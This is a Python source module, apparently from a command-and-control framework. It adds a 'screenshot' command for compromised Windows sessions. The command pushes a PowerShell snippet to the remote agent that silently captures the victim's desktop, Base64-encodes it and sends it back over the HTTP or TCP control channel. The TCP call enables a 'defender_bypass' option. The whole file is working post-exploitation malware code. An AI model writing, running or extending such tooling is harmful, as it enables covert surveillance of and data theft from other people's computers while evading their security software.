import base64
import os
import sys
import subprocess
import random
from core import shell
from core.session_handlers import session_manager

# Command Execution Imports
from core.command_execution import http_command_execution as http_exec
from core.command_execution import tcp_command_execution as tcp_exec

# Colorama Settings
from colorama import Fore, Style
brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"
COLOR_RESET  = "\001\x1b[0m\002"
UNDERLINE_ON  = "\001\x1b[4m\002"
UNDERLINE_OFF = "\001\x1b[24m\002"

def screenshot(sid: str, local_path: str = None, op_id="console"):
    """
    Capture the interactive desktop via PowerShell (Windows only),
    pull back a Base64‐PNG, and write it to local_path.
    If local_path is None, save to ~/gunner-screenshot-<sid>-<RND>.png.
    """
    session = session_manager.sessions.get(sid)
    if not session:
        print(brightred + f"[!] No such session: {sid}")
        return

    os_type = session.metadata.get("os", "").lower()
    if "windows" not in os_type:
        print(brightred + f"[!] screenshot only supported on Windows (got {os_type})")
        return

    # if no path given, build a default
    if not local_path:
        rnd = random.randint(100, 999)
        local_path = os.path.expanduser(f"~/gunner-screenshot-{sid}-{rnd}.png")

    # PowerShell snippet
    ps = (
        'Add-Type -AssemblyName System.Windows.Forms,System.Drawing; '
        '$b = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,'
        '[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); '
        '$g = [System.Drawing.Graphics]::FromImage($b); '
        '$g.CopyFromScreen(0,0,0,0,$b.Size); '
        '$ms = New-Object System.IO.MemoryStream; '
        '$b.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png); '
        '[Convert]::ToBase64String($ms.ToArray())'
    )

    # invoke on agent
    if session.transport in ("http", "https"):
        out_b64 = http_exec.run_command_http(sid, ps, op_id=op_id)
    else:
        out_b64 = tcp_exec.run_command_tcp(sid, ps, timeout=2.0, defender_bypass=True, portscan_active=True, op_id=op_id)

    if not out_b64:
        print(brightyellow + "[*] No output or command failed")
        return

    try:
        data = base64.b64decode(out_b64)
        # ensure destination dir exists
        os.makedirs(os.path.dirname(local_path) or ".", exist_ok=True)

        with open(local_path, "wb") as f:
            f.write(data)
        print(brightgreen + f"[+] Screenshot saved to {local_path}")

    except Exception as e:
        print(brightred + f"[!] Failed to save screenshot: {e}")